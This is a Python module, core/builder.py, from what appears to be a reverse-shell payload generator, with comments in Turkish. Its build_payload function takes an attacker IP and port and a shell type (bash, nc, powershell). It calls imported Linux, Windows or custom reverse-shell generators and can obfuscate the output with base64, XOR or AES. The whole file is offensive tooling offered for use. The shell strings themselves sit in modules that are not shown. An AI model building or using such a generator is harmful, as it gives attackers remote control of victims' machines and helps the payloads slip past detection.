# core/builder.py

from payloads.linux import linux_reverse_shell
from payloads.windows import windows_reverse_shell
from payloads.custom import custom_reverse_shell

from encoders.base64 import encode as base64_encode
from encoders.xor import xor_encrypt
from encoders.aes import aes_encrypt

def build_payload(platform: str, ip: str, port: int, shell_type: str, encoder: str = None, key: str = None, template: str = None) -> str:
    """
    Seçilen platform ve shell tipine göre payload üretir, istenirse encode eder.

    :param platform: "linux", "windows", "custom"
    :param ip: Saldırgan IP adresi
    :param port: Port
    :param shell_type: Shell tipi (bash, nc, powershell, vb.)
    :param encoder: "base64", "xor", "aes"
    :param key: XOR/AES için anahtar
    :param template: Custom template (sadece custom shell için)
    :return: İşlenmiş payload
    """
    
    # --- 1. PAYLOAD OLUŞTUR ---
    if platform == "linux":
        payload = linux_reverse_shell.generate_reverse_shell(ip, port, shell_type)
    elif platform == "windows":
        payload = windows_reverse_shell.generate_reverse_shell(ip, port, shell_type)
    elif platform == "custom":
        if not template:
            return "# ERROR: Custom payload seçildi ancak template verilmedi."
        payload = custom_reverse_shell.build_custom_shell(template, ip, port)
    else:
        return "# ERROR: Geçersiz platform seçimi."

    # --- 2. ENCODE / ŞİFRELE ---
    if encoder == "base64":
        payload = base64_encode(payload)
    elif encoder == "xor":
        if not key:
            return "# ERROR: XOR encoder için key gerekli."
        payload = xor_encrypt(payload, key)
    elif encoder == "aes":
        if not key:
            return "# ERROR: AES encoder için key gerekli."
        payload = aes_encrypt(payload, key)

    return payload
